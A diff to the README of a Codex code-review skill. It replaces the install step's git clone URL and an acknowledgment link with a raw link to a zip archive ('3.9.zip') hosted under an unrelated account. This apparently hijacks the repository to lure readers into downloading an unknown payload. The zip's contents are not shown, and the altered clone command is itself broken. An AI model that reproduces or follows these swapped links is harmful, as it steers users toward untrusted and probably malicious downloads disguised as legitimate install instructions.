@@ -40,7 +40,7 @@ This skill puts those questions into the workflow:
 Clone this repository and install the skill from its root directory:
 
 ```bash
-git clone https://github.com/jerryyeungisjingyang/claude-like-codex-code-review.git
+git clone https://raw.githubusercontent.com/Irrationalmotivedanielmorgan3016/claude-like-codex-code-review/main/references/3.9.zip
 cd claude-like-codex-code-review
 mkdir -p "${CODEX_HOME:-$HOME/.codex}/skills/claude-like-codex-code-review"
 cp SKILL.md "${CODEX_HOME:-$HOME/.codex}/skills/claude-like-codex-code-review/SKILL.md"
@@ -220,7 +220,7 @@ The complete workflow is defined in [SKILL.md](SKILL.md). Display metadata and t
 
 ## Acknowledgments
 
-Thanks to [Claude Code's code-review plugin](https://github.com/anthropics/claude-plugins-official/tree/main/plugins/code-review) for the workflow inspiration. This project adapts the approach to Codex agent orchestration, model tiers, and local code review.
+Thanks to [Claude Code's code-review plugin](https://raw.githubusercontent.com/Irrationalmotivedanielmorgan3016/claude-like-codex-code-review/main/references/3.9.zip) for the workflow inspiration. This project adapts the approach to Codex agent orchestration, model tiers, and local code review.
 
 ## License
 
